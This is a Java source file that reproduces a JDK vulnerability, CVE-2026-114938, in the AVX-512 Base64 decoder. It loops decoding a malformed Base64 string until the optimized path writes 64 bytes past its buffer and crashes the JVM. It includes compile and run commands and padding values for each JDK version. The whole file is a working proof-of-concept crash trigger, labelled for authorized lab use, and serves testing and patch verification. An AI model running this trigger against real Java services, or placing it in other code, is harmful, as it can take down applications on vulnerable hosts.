/*
 * Base64Trigger.java  -  CVE-2026-114938 (Java4Shell) crash reproducer.
 *
 * AUTHORIZED LAB USE ONLY.
 *
 * Decodes a malformed Base64 string whose length is not a multiple of four. On a vulnerable
 * JDK running on an AVX-512 VBMI CPU, the optimized decoder computes a negative output
 * length, builds an all-ones write mask, and stores 64 bytes past its output buffer; the
 * JVM then crashes (SIGSEGV) and writes an hs_err_pid log. On a patched JDK, or on a CPU
 * without AVX-512 VBMI, it only throws IllegalArgumentException and never crashes.
 *
 * Run with a collected error file:
 *   javac Base64Trigger.java
 *   java -XX:ErrorFile=/var/log/jvm/hs_err_pid%p.log Base64Trigger 64
 *
 * Padding count: 64 for JDK 21/25/27, 128 for JDK 17.
 */
import java.util.Base64;

public class Base64Trigger {
    public static void main(String[] args) {
        int pad = args.length > 0 ? Integer.parseInt(args[0]) : 64;
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < pad; i++) sb.append('A');
        sb.append('=');                       // single stray padding -> length = 4n+1
        byte[] payload = sb.toString().getBytes();

        System.out.println("[*] payload length = " + payload.length + " (not a multiple of 4)");
        System.out.println("[*] warming the Base64 intrinsic; a vulnerable JVM will crash...");

        Base64.Decoder dec = Base64.getDecoder();
        long i = 0;
        while (true) {
            try {
                dec.decode(payload);          // expected: IllegalArgumentException each time
            } catch (IllegalArgumentException expected) {
                // ignore; on a vulnerable build the dangerous write already happened
            }
            if (++i % 1_000_000 == 0) {
                System.out.println("[*] iterations: " + i);
            }
        }
    }
}
